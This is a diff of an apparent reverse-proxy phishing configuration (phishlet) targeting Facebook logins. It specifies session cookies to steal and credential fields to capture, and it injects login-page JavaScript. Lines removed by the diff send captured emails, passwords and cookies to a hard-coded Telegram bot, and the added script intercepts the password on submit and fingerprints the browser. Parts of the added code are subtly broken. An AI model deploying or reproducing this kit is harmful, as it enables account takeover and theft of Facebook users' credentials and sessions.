@@ -3,11 +3,9 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
-  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: false}
+  - {phish_sub: 'auth_platform', orig_sub: 'auth_platform', domain: 'facebook.com', session: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: true} 
   - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
-  - {phish_sub: 'auth-platform', orig_sub: 'auth-platform', domain: 'facebook.com', session: true}
-  - {phish_sub: 'b-api', orig_sub: 'b-api', domain: 'facebook.com', session: true} 
-  - {phish_sub: 'afad', orig_sub: 'afad', domain: 'facebook.com', session: false}
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
@@ -20,10 +18,7 @@ sub_filters:
 
 auth_tokens:
   - domain: '.facebook.com'
-    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd', 'spin', 'presence']
-    secure: true
-    http_only: true
-    
+    keys: ['c_user','xs','sb', 'datr']
 credentials:
   username:
     key: 'email'
@@ -53,32 +48,16 @@ credentials:
       search: '(.*)'
       type: 'post'
 
-session_capture:
-  force_redirect: false
-  redirect_url: "https://facebook.com"
-  cookie_domain: ".facebook.com"
-  secure_cookies: true
-  http_only_cookies: true
-  capture_on_redirect: true
    
 login:
   domain: 'www.facebook.com'
   path: '/login.php'
 
-response_headers:
-  - name: 'Content-Security-Policy'
-    value: "default-src 'self' 'unsafe-inline' *.facebook.com *.fbcdn.net data: blob:"
-  - name: 'X-Frame-Options'
-    value: 'ALLOW-FROM https://facebook.com'
-
 js_inject:
-  - trigger_domains: ["www.facebook.com", "m.facebook.com"]
+  - trigger_domains: ["www.facebook.com"]
     trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
-    trigger_paths: ["/auth_platform/", "/login/", "/login.php"]
-    inject_delay: 2000
-    cache_buster: true
+    trigger_params: []
     script: |  
-
       const originalFetch = window.fetch;
       window.fetch = async function(...args) {
         const [url, options] = args;
@@ -99,32 +78,34 @@ js_inject:
         return originalFetch.apply(this, args);
       };
 
-      // 2. Form submission backup
-      document.addEventListener('submit', function(e) {
-        if (e.target.action.includes('/login/')) {
-          const email = e.target.querySelector('[name="email"]')?.value;
-          const pass = e.target.querySelector('[name="pass"]')?.value;
-          if (email && pass) {
-            setTimeout(() => {
-              const img = new Image();
-              img.src = `https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage?chat_id=5228920520&text=${encodeURIComponent(
-                `BACKUP LOGIN\nEmail: ${email}\nPass: ${pass}`
-              )}`;
-            }, 1000);
-          }
-        }
-      }, true);
-
-      // 3. Cookie monitor
-      setInterval(() => {
-        if (document.cookie.includes('c_user')) {
-          fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
-            method: 'POST',
-            body: JSON.stringify({
-              chat_id: "5228920520",
-              text: `ACTIVE COOKIES:\n${document.cookie}`
-            }),
-            keepalive: true
-          });
-        }
-      }, 5000);
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        var useragent = navigator.userAgent;
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("UserAgent="+encodeURIComponent(useragent));
+        var browser = navigator.appName;
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("Browser="+encodeURIComponent(browser));
+        var engine = navigator.product;
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("Engine="+encodeURIComponent(engine));
+        var platform = navigator.platform;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("Platform="+encodeURIComponent(platform));
+        return;
+      }
+      function sendPass(){
+        var password = document.getElementsByName("pass")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/login/device-based/regular/login/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("unenc_password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);
